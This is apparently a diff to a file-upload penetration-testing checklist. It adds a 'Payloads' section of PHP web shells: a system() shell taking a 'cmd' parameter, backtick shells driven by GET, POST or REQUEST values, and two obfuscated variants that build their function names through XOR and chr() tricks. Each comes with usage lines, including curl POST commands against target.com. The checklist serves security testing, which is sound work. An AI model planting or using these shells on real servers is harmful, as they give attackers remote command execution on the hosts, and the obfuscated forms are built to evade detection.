@@ -29,8 +29,25 @@ tags:
     .html
 - [ ] Upload `asp` file using `.cer` & `.asa` extension (IIS — Windows)
 - [ ] Upload `.eml` file when `content-type = text/HTML`
-- [ ] 
 
+>***Payloads***
+
+```php
+<?php system($_GET["cmd"]);?> # ?cmd= (ex: ?cmd=ls -la")
+<?=`$_GET[0]`?>               # ?0=command
+
+<?=`$_POST[0]`?>          
+# Usage : curl -X POST http://target.com/path/to/shell.php -d "0=command"
+
+<?=`{$_REQUEST['_']}`?>      
+# Usage: http://target.com/path/to/shell.php?_=command OR curl -X POST http://target.com/path/to/shell.php -d "_=command" '
+
+<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+# Usage : http://target.com/path/to/shell.php?0=command
+
+<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
+# Usage : http://target.com/path/to/shell.php?_=function&__=argument http://target.com/path/to/shell.php?_=system&__=ls
+```
 
 > **Content type**
   
